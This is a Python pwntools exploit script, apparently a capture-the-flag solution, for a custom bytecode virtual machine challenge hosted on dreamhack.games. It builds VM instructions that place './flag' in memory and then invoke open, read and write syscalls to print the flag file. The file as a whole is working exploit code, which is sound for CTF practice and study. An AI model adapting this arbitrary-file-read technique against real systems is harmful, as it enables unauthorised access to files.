#!/usr/bin/env python3

from pwn import *
#context.log_level = 'debug'

class Instruction:
    def __init__(self):
        self.reg = {'a': b'\x04', 'b': b'\x08', 'c': b'\x02', 'd': b'\x01'}

    def mov(self, sel, val):
        self.sel = sel
        self.val = val

        self.payload = bytes([self.val])
        self.payload += b'\x04'
        self.payload += self.reg[self.sel]
        return self.payload

    def add(self, sel, val):
        self.sel = sel
        self.val = val

        self.payload = bytes([self.val])
        self.payload += b'\x08'
        self.payload += self.reg[self.sel]
        return self.payload

    def lea(self, sel1, sel2):
        self.sel1 = sel1
        self.sel2 = sel2

        self.payload = self.reg[self.sel2]
        self.payload += b'\x02'
        self.payload += self.reg[self.sel1]
        return self.payload

    def sys(self, sel1, sel2):
        self.act = {"open": b'\x04', "read": b'\x02', "write": b'\x01'}
        self.sel1 = self.act[sel1]
        self.sel2 = sel2

        self.payload = self.reg[self.sel2]
        self.payload += b'\x01'
        self.payload += self.sel1
        return self.payload

def exploit(r, inst):
    # set "./flag" string to open arg1
    payload = inst.mov('c', 0x00)
    payload += inst.mov('d', 0x2e)
    payload += inst.lea('c', 'd')
    payload += inst.mov('c', 0x01)
    payload += inst.mov('d', 0x2f)
    payload += inst.lea('c', 'd')
    payload += inst.mov('c', 0x02)
    payload += inst.mov('d', 0x66)
    payload += inst.lea('c', 'd')
    payload += inst.mov('c', 0x03)
    payload += inst.mov('d', 0x6c)
    payload += inst.lea('c', 'd')
    payload += inst.mov('c', 0x04)
    payload += inst.mov('d', 0x61)
    payload += inst.lea('c', 'd')
    payload += inst.mov('c', 0x05)
    payload += inst.mov('d', 0x67)
    payload += inst.lea('c', 'd')
    # call open("./flag", 0x00)
    payload += inst.mov('d', 0x00)
    payload += inst.mov('c', 0x00)
    payload += inst.sys("open", 'd')

    # Set arg for read()
    payload += inst.mov('c', 0x10)
    payload += inst.mov('a', 0x40)
    # call read(fd, mem1 + 0x10, 0x40)
    payload += inst.sys("read", 'a')

    # Set arg for write()
    payload += inst.mov('d', 0x01)
    payload += inst.mov('c', 0x10)
    # call write(0x1, mem1 + 0x10, len)
    payload += inst.sys("write", 'd')

    r.sendafter(":", payload)
    r.interactive()

def main(r):
    inst = Instruction()
    exploit(r, inst)

if __name__ == "__main__":
    r = remote("host3.dreamhack.games", 11312)
    #r = remote("localhost", 9929)
    main(r)

